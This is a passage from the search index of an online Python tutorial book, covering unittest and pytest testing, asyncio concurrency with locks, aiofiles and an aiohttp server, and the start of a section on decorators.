    "section": "13.2 Basic Structure of a Test Case",
    "text": "13.2 Basic Structure of a Test Case\nA test case is created by subclassing unittest.TestCase. Each test is defined as a method within the class. Methods starting with the word “test” are recognized as test methods.\n\n13.2.1 Example\nimport unittest\n\nclass TestStringMethods(unittest.TestCase):\n\n    def test_upper(self):\n        self.assertEqual('foo'.upper(), 'FOO')\n\n    def test_isupper(self):\n        self.assertTrue('FOO'.isupper())\n        self.assertFalse('Foo'.isupper())\n\n    def test_split(self):\n        s = 'hello world'\n        self.assertEqual(s.split(), ['hello', 'world'])\n        with self.assertRaises(TypeError):\n            s.split(2)\n\nif __name__ == '__main__':\n    unittest.main()\n\n\n13.2.2 Explanation\n\nTest Case: A test case is created by subclassing unittest.TestCase.\nTest Methods: Methods starting with test_ are test cases. In the example, test_upper, test_isupper, and test_split are test methods.\nAssertions: Assertions are used to check if a condition is true. If an assertion fails, the test fails.",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#running-tests-1",
    "href": "11_python_testing.html#running-tests-1",
    "title": "12  Introduction to Testing in Python",
    "section": "13.3 Running Tests",
    "text": "13.3 Running Tests\nThe simplest way to run tests is to include the following block at the bottom of your test file:\nif __name__ == '__main__':\n    unittest.main()\nThis will run all test methods in the file when the file is executed.",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#common-assertions",
    "href": "11_python_testing.html#common-assertions",
    "title": "12  Introduction to Testing in Python",
    "section": "13.4 Common Assertions",
    "text": "13.4 Common Assertions\nHere are some commonly used assertions provided by unittest:\n\nassertEqual(a, b): Check if a == b\nassertNotEqual(a, b): Check if a != b\nassertTrue(x): Check if x is True\nassertFalse(x): Check if x is False\nassertIs(a, b): Check if a is b\nassertIsNot(a, b): Check if a is not b\nassertIsNone(x): Check if x is None\nassertIsNotNone(x): Check if x is not None\nassertIn(a, b): Check if a is in b\nassertNotIn(a, b): Check if a is not in b\nassertIsInstance(a, b): Check if a is an instance of b\nassertNotIsInstance(a, b): Check if a is not an instance of b\n\n\n13.4.1 Example\nclass TestAssertions(unittest.TestCase):\n\n    def test_assertions(self):\n        self.assertEqual(1 + 1, 2)\n        self.assertTrue(1 == 1)\n        self.assertFalse(1 == 0)\n        self.assertIs(None, None)\n        self.assertIsNot(1, None)\n        self.assertIsNone(None)\n        self.assertIsNotNone(1)\n        self.assertIn(1, [1, 2, 3])\n        self.assertNotIn(4, [1, 2, 3])\n        self.assertIsInstance(1, int)\n        self.assertNotIsInstance(1, str)",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#test-fixtures",
    "href": "11_python_testing.html#test-fixtures",
    "title": "12  Introduction to Testing in Python",
    "section": "13.5 Test Fixtures",
    "text": "13.5 Test Fixtures\nTest fixtures are used to provide a fixed baseline upon which tests can run. This can include setting up databases, creating directories, or starting services.\n\n13.5.1 Setup and Teardown\n\nsetUp(): This method is called before each test. It is used to set up any state specific to the test.\ntearDown(): This method is called after each test. It is used to clean up any state that was set up in setUp().\n\n\n\n13.5.2 Example\nclass TestWithFixtures(unittest.TestCase):\n\n    def setUp(self):\n        self.resource = \"some setup resource\"\n        print(f\"Setup: {self.resource}\")\n\n    def tearDown(self):\n        print(f\"TearDown: {self.resource}\")\n        self.resource = None\n\n    def test_something(self):\n        self.assertIsNotNone(self.resource)\n        print(f\"Test: {self.resource}\")\n\nif __name__ == '__main__':\n    unittest.main()",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#test-suites",
    "href": "11_python_testing.html#test-suites",
    "title": "12  Introduction to Testing in Python",
    "section": "13.6 Test Suites",
    "text": "13.6 Test Suites\nA test suite is a collection of test cases, test suites, or both. It is used to aggregate tests that should be executed together.\n\n13.6.1 Example\ndef suite():\n    suite = unittest.TestSuite()\n    suite.addTest(TestStringMethods('test_upper'))\n    suite.addTest(TestStringMethods('test_isupper'))\n    suite.addTest(TestStringMethods('test_split'))\n    return suite\n\nif __name__ == '__main__':\n    runner = unittest.TextTestRunner()\n    runner.run(suite())",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#skipping-tests",
    "href": "11_python_testing.html#skipping-tests",
    "title": "12  Introduction to Testing in Python",
    "section": "13.7 Skipping Tests",
    "text": "13.7 Skipping Tests\nTests can be skipped using the unittest.skip decorator or methods like unittest.skipIf and unittest.skipUnless.\n\n13.7.1 Example\nclass TestSkipping(unittest.TestCase):\n\n    @unittest.skip(\"demonstrating skipping\")\n    def test_skip(self):\n        self.fail(\"shouldn't happen\")\n\n    @unittest.skipIf(1 == 1, \"not testing\")\n    def test_skip_if(self):\n        self.fail(\"shouldn't happen\")\n\n    @unittest.skipUnless(1 == 1, \"not testing\")\n    def test_skip_unless(self):\n        self.assertTrue(True)\n\nif __name__ == '__main__':\n    unittest.main()",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#expected-failures",
    "href": "11_python_testing.html#expected-failures",
    "title": "12  Introduction to Testing in Python",
    "section": "13.8 Expected Failures",
    "text": "13.8 Expected Failures\nSometimes, a test is expected to fail. This can be indicated using the unittest.expectedFailure decorator.\n\n13.8.1 Example\nclass TestExpectedFailure(unittest.TestCase):\n\n    @unittest.expectedFailure\n    def test_expected_failure(self):\n        self.assertEqual(1, 0)\n\nif __name__ == '__main__':\n    unittest.main()",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#mocking",
    "href": "11_python_testing.html#mocking",
    "title": "12  Introduction to Testing in Python",
    "section": "13.9 Mocking",
    "text": "13.9 Mocking\nThe unittest.mock module allows you to replace parts of your system under test and make assertions about how they have been used.\n\n13.9.1 Example\nfrom unittest.mock import MagicMock\n\nclass TestMocking(unittest.TestCase):\n\n    def test_mocking(self):\n        mock = MagicMock()\n        mock.method.return_value = 'foo'\n        self.assertEqual(mock.method(), 'foo')\n        mock.method.assert_called_once()\n\nif __name__ == '__main__':\n    unittest.main()",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#parameterized-tests",
    "href": "11_python_testing.html#parameterized-tests",
    "title": "12  Introduction to Testing in Python",
    "section": "13.10 Parameterized Tests",
    "text": "13.10 Parameterized Tests\nParameterized tests allow you to run the same test with different inputs.\n\n13.10.1 Example using parameterized package\nfrom parameterized import parameterized\n\nclass TestParameterized(unittest.TestCase):\n\n    @parameterized.expand([\n        (\"foo\", \"foo\".upper(), \"FOO\"),\n        (\"bar\", \"bar\".upper(), \"BAR\"),\n        (\"baz\", \"baz\".upper(), \"BAZ\"),\n    ])\n    def test_upper(self, name, input, expected):\n        self.assertEqual(input, expected)\n\nif __name__ == '__main__':\n    unittest.main()",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#running-tests-with-unittest-command-line-interface",
    "href": "11_python_testing.html#running-tests-with-unittest-command-line-interface",
    "title": "12  Introduction to Testing in Python",
    "section": "13.11 Running Tests with unittest Command Line Interface",
    "text": "13.11 Running Tests with unittest Command Line Interface\nYou can run tests using the command line interface provided by unittest.\npython -m unittest discover -s tests\n\n-s: Specifies the start directory for discovering tests.\n-p: Specifies the pattern for test file discovery.",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#conclusion-1",
    "href": "11_python_testing.html#conclusion-1",
    "title": "12  Introduction to Testing in Python",
    "section": "13.12 Conclusion",
    "text": "13.12 Conclusion\nThe unittest module in Python is a powerful and flexible framework for testing. By understanding and utilizing its features, you can create robust and maintainable test suites for your applications. This tutorial covered the basics and some advanced features of unittest, including test cases, test fixtures, test suites, skipping tests, expected failures, mocking, and parameterized tests.",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#installation",
    "href": "11_python_testing.html#installation",
    "title": "12  Introduction to Testing in Python",
    "section": "14.1 Installation",
    "text": "14.1 Installation\nTo install pytest, you can use pip:\npip install pytest",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#basic-usage",
    "href": "11_python_testing.html#basic-usage",
    "title": "12  Introduction to Testing in Python",
    "section": "14.2 Basic Usage",
    "text": "14.2 Basic Usage\n\n14.2.1 Writing Tests\npytest identifies test files and test functions based on specific naming conventions. By default, it looks for files matching test_*.py or *_test.py patterns.\n\n\n14.2.2 Example\nCreate a file named test_example.py:\ndef test_addition():\n    assert 1 + 1 == 2\n\ndef test_subtraction():\n    assert 1 - 1 == 0\n\n\n14.2.3 Running Tests\nTo run the tests, simply use the pytest command in the terminal:\npytest\n\n\n14.2.4 Output\nWhen you run pytest, it will automatically discover and execute all the tests in the current directory and its subdirectories. The output will provide detailed information about the tests, including any failures or errors.",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#assertions",
    "href": "11_python_testing.html#assertions",
    "title": "12  Introduction to Testing in Python",
    "section": "14.3 Assertions",
    "text": "14.3 Assertions\npytest uses standard Python assert statements for assertions. This makes the tests easy to write and understand.\n\n14.3.1 Example\ndef test_string_methods():\n    s = \"hello\"\n    assert s.upper() == \"HELLO\"\n    assert s.islower()\n    assert s.startswith(\"h\")",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#fixtures",
    "href": "11_python_testing.html#fixtures",
    "title": "12  Introduction to Testing in Python",
    "section": "14.4 Fixtures",
    "text": "14.4 Fixtures\nFixtures are functions that provide a fixed baseline for tests. They are used to set up and clean up resources needed by tests. Fixtures are defined using the @pytest.fixture decorator.\n\n14.4.1 Example\nimport pytest\n\n@pytest.fixture\ndef sample_data():\n    return {\"name\": \"pytest\", \"version\": \"6.2.5\"}\n\ndef test_sample_data(sample_data):\n    assert sample_data[\"name\"] == \"pytest\"\n    assert sample_data[\"version\"] == \"6.2.5\"\n\n\n14.4.2 Using Fixtures\nFixtures can be used by including them as arguments in test functions. pytest will automatically recognize and provide the fixture data.",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#parameterized-tests-1",
    "href": "11_python_testing.html#parameterized-tests-1",
    "title": "12  Introduction to Testing in Python",
    "section": "14.5 Parameterized Tests",
    "text": "14.5 Parameterized Tests\nParameterized tests allow you to run the same test with different inputs. This is useful for testing functions with multiple sets of inputs and expected outputs.\n\n14.5.1 Example\nimport pytest\n\n@pytest.mark.parametrize(\"x, y, result\", [\n    (1, 2, 3),\n    (4, 5, 9),\n    (10, 11, 21),\n])\ndef test_addition(x, y, result):\n    assert x + y == result",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#grouping-tests",
    "href": "11_python_testing.html#grouping-tests",
    "title": "12  Introduction to Testing in Python",
    "section": "14.6 Grouping Tests",
    "text": "14.6 Grouping Tests\nYou can group tests using classes. Test classes should not have an __init__ method.\n\n14.6.1 Example\nclass TestMathOperations:\n\n    def test_addition(self):\n        assert 1 + 1 == 2\n\n    def test_subtraction(self):\n        assert 2 - 1 == 1",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#markers",
    "href": "11_python_testing.html#markers",
    "title": "12  Introduction to Testing in Python",
    "section": "14.7 Markers",
    "text": "14.7 Markers\nMarkers are used to label tests for specific purposes, such as grouping, skipping, or executing under certain conditions.\n\n14.7.1 Example\nimport pytest\n\n@pytest.mark.slow\ndef test_slow_operation():\n    import time\n    time.sleep(5)\n    assert True\n\n\n14.7.2 Running Marked Tests\nYou can run tests with specific markers using the -m option:\npytest -m slow\n\n\n14.7.3 Skipping Tests\nYou can skip tests using the @pytest.mark.skip decorator or conditionally with @pytest.mark.skipif.\n\n\n14.7.4 Example\n@pytest.mark.skip(reason=\"Skipping this test for now\")\ndef test_skip():\n    assert False\n\n@pytest.mark.skipif(1 == 1, reason=\"Conditional skip\")\ndef test_conditional_skip():\n    assert False",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#expected-failures-1",
    "href": "11_python_testing.html#expected-failures-1",
    "title": "12  Introduction to Testing in Python",
    "section": "14.8 Expected Failures",
    "text": "14.8 Expected Failures\nYou can mark tests as expected to fail using the @pytest.mark.xfail decorator.\n\n14.8.1 Example\n@pytest.mark.xfail\ndef test_expected_failure():\n    assert False",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#plugins",
    "href": "11_python_testing.html#plugins",
    "title": "12  Introduction to Testing in Python",
    "section": "14.9 Plugins",
    "text": "14.9 Plugins\npytest has a rich ecosystem of plugins that extend its functionality. Some popular plugins include:\n\npytest-cov: For measuring code coverage.\npytest-xdist: For running tests in parallel.\npytest-mock: For mocking in tests.\n\n\n14.9.1 Installing Plugins\nPlugins can be installed using pip:\npip install pytest-cov pytest-xdist pytest-mock\n\n\n14.9.2 Using Plugins\nPlugins are automatically recognized by pytest once installed. You can use their features by following the respective plugin documentation.\n\n\n14.9.3 Example: Code Coverage with pytest-cov\npytest --cov=my_module tests/",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#customizing-pytest-configuration",
    "href": "11_python_testing.html#customizing-pytest-configuration",
    "title": "12  Introduction to Testing in Python",
    "section": "14.10 Customizing pytest Configuration",
    "text": "14.10 Customizing pytest Configuration\nYou can customize pytest behavior using a configuration file named pytest.ini, tox.ini, or setup.cfg.\n\n14.10.1 Example pytest.ini\n[pytest]\naddopts = -ra -q\nmarkers =\n    slow: marks tests as slow (deselect with '-m \"not slow\"')\n    smoke: marks tests as smoke tests\n\n\n14.10.2 Explanation\n\naddopts: Additional options to pass to pytest.\nmarkers: Custom markers for organizing tests.",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#capturing-output",
    "href": "11_python_testing.html#capturing-output",
    "title": "12  Introduction to Testing in Python",
    "section": "14.11 Capturing Output",
    "text": "14.11 Capturing Output\npytest captures output from print statements and logs during test execution. You can view this output by using the -s option.\n\n14.11.1 Example\npytest -s",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#debugging-tests",
    "href": "11_python_testing.html#debugging-tests",
    "title": "12  Introduction to Testing in Python",
    "section": "14.12 Debugging Tests",
    "text": "14.12 Debugging Tests\nYou can use the --pdb option to drop into the Python debugger (pdb) on test failures.\n\n14.12.1 Example\npytest --pdb",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#integrating-with-continuous-integration-ci-systems",
    "href": "11_python_testing.html#integrating-with-continuous-integration-ci-systems",
    "title": "12  Introduction to Testing in Python",
    "section": "14.13 Integrating with Continuous Integration (CI) Systems",
    "text": "14.13 Integrating with Continuous Integration (CI) Systems\npytest can be easily integrated with CI systems like Jenkins, Travis CI, CircleCI, and GitHub Actions.\n\n14.13.1 Example: GitHub Actions\nCreate a .github/workflows/python-app.yml file:\nname: Python application\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: actions/checkout@v2\n    - name: Set up Python\n      uses: actions/setup-python@v2\n      with:\n        python-version: '3.x'\n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        pip install pytest\n    - name: Run tests\n      run: |\n        pytest",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#advanced-features",
    "href": "11_python_testing.html#advanced-features",
    "title": "12  Introduction to Testing in Python",
    "section": "14.14 Advanced Features",
    "text": "14.14 Advanced Features\n\n14.14.1 Assertions with Custom Messages\nYou can provide custom messages for assertions to make the output more informative.\n\n\n14.14.2 Example\ndef test_custom_message():\n    assert 1 + 1 == 3, \"Expected result to be 3\"\n\n\n14.14.3 Using pytest.raises for Exception Handling\nYou can test for exceptions using the pytest.raises context manager.\n\n\n14.14.4 Example\ndef test_exception():\n    with pytest.raises(ZeroDivisionError):\n        1 / 0\n\n\n14.14.5 Using pytest.approx for Floating Point Comparisons\nYou can use pytest.approx for comparing floating-point numbers.\n\n\n14.14.6 Example\ndef test_approx():\n    assert 0.1 + 0.2 == pytest.approx(0.3)",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#best-practices",
    "href": "11_python_testing.html#best-practices",
    "title": "12  Introduction to Testing in Python",
    "section": "14.15 Best Practices",
    "text": "14.15 Best Practices\n\nUse Descriptive Test Names: Use descriptive names for test functions and methods to make the test purpose clear.\nKeep Tests Independent: Ensure tests do not depend on each other. Each test should be able to run independently.\nUse Fixtures Wisely: Use fixtures to manage setup and teardown of resources.\nOrganize Tests: Organize tests into directories and modules for better structure.\nUse Markers: Use markers to categorize and select tests.\nContinuous Integration: Integrate pytest with a CI system to automate testing.",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#conclusion-2",
    "href": "11_python_testing.html#conclusion-2",
    "title": "12  Introduction to Testing in Python",
    "section": "14.16 Conclusion",
    "text": "14.16 Conclusion\npytest is a powerful and flexible testing framework that makes it easy to write and run tests. Its simple syntax, extensive features, and rich ecosystem of plugins make it a popular choice for testing in Python. By understanding and utilizing the features of pytest, you can create robust and maintainable test suites for your applications.",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html",
    "href": "12_python_adv_concepts.html",
    "title": "13  Advanced Python Concepts",
    "section": "",
    "text": "13.0.1 Asynchronous Programming with asyncio\nAsynchronous programming allows your code to perform tasks concurrently, improving efficiency, especially in I/O-bound operations.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#table-of-contents",
    "href": "12_python_adv_concepts.html#table-of-contents",
    "title": "13  Advanced Python Concepts",
    "section": "14.1 Table of Contents",
    "text": "14.1 Table of Contents\n\nIntroduction to Asynchronous Programming\nKey Concepts\nBasic Usage\nTasks and Coroutines\nManaging Tasks\nSynchronization Primitives\nAsynchronous I/O\nCreating a Simple Web Server\nBest Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#introduction-to-asynchronous-programming",
    "href": "12_python_adv_concepts.html#introduction-to-asynchronous-programming",
    "title": "13  Advanced Python Concepts",
    "section": "14.2 Introduction to Asynchronous Programming",
    "text": "14.2 Introduction to Asynchronous Programming\nAsynchronous programming allows a program to perform tasks concurrently, without waiting for one task to complete before starting another. This is especially useful for I/O-bound and high-level structured network code.\nIn synchronous programming, tasks are executed sequentially. If one task takes a long time to complete (e.g., waiting for a network response), it can block the entire program. Asynchronous programming avoids this by allowing other tasks to run while waiting for long-running tasks to complete.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#key-concepts",
    "href": "12_python_adv_concepts.html#key-concepts",
    "title": "13  Advanced Python Concepts",
    "section": "14.3 Key Concepts",
    "text": "14.3 Key Concepts\nBefore diving into asyncio, it’s important to understand some key concepts:\n\nCoroutines: Special functions defined with async def that can be paused and resumed.\nEvent Loop: The core of an asynchronous application, responsible for executing asynchronous tasks, handling I/O operations, and coordinating the overall execution flow.\nTasks: Wrappers around coroutines that can be scheduled and managed by the event loop.\nFutures: Represent results of asynchronous operations that may not be available yet.\nAwait: A keyword used to pause the execution of a coroutine until the awaited coroutine completes.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#basic-usage",
    "href": "12_python_adv_concepts.html#basic-usage",
    "title": "13  Advanced Python Concepts",
    "section": "14.4 Basic Usage",
    "text": "14.4 Basic Usage\n\n14.4.1 Example: Running a Simple Coroutine\nLet’s start with a simple example to understand how coroutines and the event loop work together:\nimport asyncio\n\nasync def say_hello():\n    print(\"Hello\")\n    await asyncio.sleep(1)\n    print(\"World\")\n\n# Get the default event loop and run the coroutine\nasyncio.run(say_hello())\nIn this example, say_hello is a coroutine that prints “Hello”, waits for 1 second, and then prints “World”. The asyncio.run function starts an event loop, runs the coroutine, and closes the loop when the coroutine is finished.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#tasks-and-coroutines",
    "href": "12_python_adv_concepts.html#tasks-and-coroutines",
    "title": "13  Advanced Python Concepts",
    "section": "14.5 Tasks and Coroutines",
    "text": "14.5 Tasks and Coroutines\n\n14.5.1 Creating and Running Multiple Coroutines\nYou can create multiple coroutines and run them concurrently using asyncio.gather:\nimport asyncio\n\nasync def task1():\n    await asyncio.sleep(1)\n    print(\"Task 1 completed\")\n\nasync def task2():\n    await asyncio.sleep(2)\n    print(\"Task 2 completed\")\n\nasync def main():\n    await asyncio.gather(task1(), task2())\n\nasyncio.run(main())\nIn this example, task1 and task2 are coroutines that run concurrently. asyncio.gather runs both coroutines and waits for both to complete.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#managing-tasks",
    "href": "12_python_adv_concepts.html#managing-tasks",
    "title": "13  Advanced Python Concepts",
    "section": "14.6 Managing Tasks",
    "text": "14.6 Managing Tasks\n\n14.6.1 Creating and Cancelling Tasks\nYou can create tasks explicitly using asyncio.create_task, and you can cancel tasks if needed:\nimport asyncio\n\nasync def task1():\n    try:\n        await asyncio.sleep(3)\n    except asyncio.CancelledError:\n        print(\"Task 1 was cancelled\")\n        raise\n\nasync def task2():\n    await asyncio.sleep(2)\n    print(\"Task 2 completed\")\n\nasync def main():\n    t1 = asyncio.create_task(task1())\n    t2 = asyncio.create_task(task2())\n\n    await asyncio.sleep(1)\n    t1.cancel()\n\n    await asyncio.gather(t1, t2, return_exceptions=True)\n\nasyncio.run(main())\nIn this example, task1 is cancelled after 1 second, while task2 completes normally. The CancelledError is caught and handled in task1.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#synchronization-primitives",
    "href": "12_python_adv_concepts.html#synchronization-primitives",
    "title": "13  Advanced Python Concepts",
    "section": "14.7 Synchronization Primitives",
    "text": "14.7 Synchronization Primitives\n\n14.7.1 Using Locks\nasyncio provides several synchronization primitives, such as Lock, Event, Condition, and Semaphore.\n\n14.7.1.1 Example: Using a Lock\nimport asyncio\n\nlock = asyncio.Lock()\n\nasync def task1():\n    async with lock:\n        print(\"Task 1 acquired lock\")\n        await asyncio.sleep(2)\n        print(\"Task 1 released lock\")\n\nasync def task2():\n    async with lock:\n        print(\"Task 2 acquired lock\")\n        await asyncio.sleep(2)\n        print(\"Task 2 released lock\")\n\nasync def main():\n    await asyncio.gather(task1(), task2())\n\nasyncio.run(main())\nIn this example, task1 and task2 acquire and release the same lock. Only one task can hold the lock at a time, ensuring that the critical section is accessed by only one task at a time.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#asynchronous-io",
    "href": "12_python_adv_concepts.html#asynchronous-io",
    "title": "13  Advanced Python Concepts",
    "section": "14.8 Asynchronous I/O",
    "text": "14.8 Asynchronous I/O\n\n14.8.1 Example: Asynchronous File I/O\nYou can perform asynchronous file I/O using the aiofiles library:\nimport asyncio\nimport aiofiles\n\nasync def write_file():\n    async with aiofiles.open('example.txt', mode='w') as f:\n        await f.write('Hello, asyncio!')\n\nasync def read_file():\n    async with aiofiles.open('example.txt', mode='r') as f:\n        contents = await f.read()\n        print(contents)\n\nasync def main():\n    await write_file()\n    await read_file()\n\nasyncio.run(main())\nIn this example, write_file writes to a file asynchronously, and read_file reads from the file asynchronously using the aiofiles library.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#creating-a-simple-web-server",
    "href": "12_python_adv_concepts.html#creating-a-simple-web-server",
    "title": "13  Advanced Python Concepts",
    "section": "14.9 Creating a Simple Web Server",
    "text": "14.9 Creating a Simple Web Server\n\n14.9.1 Example: Simple HTTP Server with aiohttp\nYou can create an asynchronous HTTP server using the aiohttp library:\nfrom aiohttp import web\nimport asyncio\n\nasync def handle(request):\n    return web.Response(text=\"Hello, asyncio!\")\n\napp = web.Application()\napp.add_routes([web.get('/', handle)])\n\nif __name__ == '__main__':\n    web.run_app(app)\nIn this example, we create a simple HTTP server that responds with “Hello, asyncio!” to any GET request on the root URL.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#best-practices",
    "href": "12_python_adv_concepts.html#best-practices",
    "title": "13  Advanced Python Concepts",
    "section": "14.10 Best Practices",
    "text": "14.10 Best Practices\n\nAvoid Blocking Calls: Ensure that you do not use blocking calls in your asynchronous code, as this can block the event loop and degrade performance.\nUse async and await Appropriately: Make sure to use async and await for all asynchronous functions and calls.\nHandle Exceptions: Always handle exceptions in coroutines and tasks to prevent them from propagating and crashing the application.\nLimit Concurrency: Use semaphores or other synchronization primitives to limit concurrency and avoid overwhelming resources.\nLeverage Libraries: Use well-established libraries like aiohttp for HTTP operations and aiomysql or aiopg for database access to avoid reinventing the wheel.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#conclusion-1",
    "href": "12_python_adv_concepts.html#conclusion-1",
    "title": "13  Advanced Python Concepts",
    "section": "14.11 Conclusion",
    "text": "14.11 Conclusion\nThe asyncio module provides a powerful framework for writing concurrent and asynchronous code in Python. By leveraging its features, you can build efficient and scalable applications that handle I/O-bound tasks effectively. This tutorial covered the basics of asyncio, including coroutines, tasks, synchronization primitives, and asynchronous I/O. With this foundation, you can explore more advanced topics and libraries to enhance your asynchronous programming skills.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#table-of-contents-1",
    "href": "12_python_adv_concepts.html#table-of-contents-1",
    "title": "13  Advanced Python Concepts",
    "section": "15.1 Table of Contents",
    "text": "15.1 Table of Contents\n\nIntroduction to Decorators\nFunction Decorators\nClass Decorators\nUsing Multiple Decorators\nBuilt-in Decorators\nPractical Examples\nBest Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#introduction-to-decorators",
    "href": "12_python_adv_concepts.html#introduction-to-decorators",
    "title": "13  Advanced Python Concepts",
    "section": "15.2 Introduction to Decorators",
    "text": "15.2 Introduction to Decorators\nA decorator is a function that takes another function and extends its behavior without explicitly modifying it. Decorators provide a way to dynamically alter the functionality of your code.\n\n15.2.1 Basic Decorator Example\ndef my_decorator(func):\n    def wrapper():\n        print(\"Something is happening before the function is called.\")\n        func()\n        print(\"Something is happening after the function is called.\")\n    return wrapper\n\n@my_decorator\ndef say_hello():\n    print(\"Hello!\")\n\nsay_hello()\nIn this example, my_decorator is a decorator function that wraps the say_hello function, adding some behavior before and after it is called.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#function-decorators",
    "href": "12_python_adv_concepts.html#function-decorators",
    "title": "13  Advanced Python Concepts",
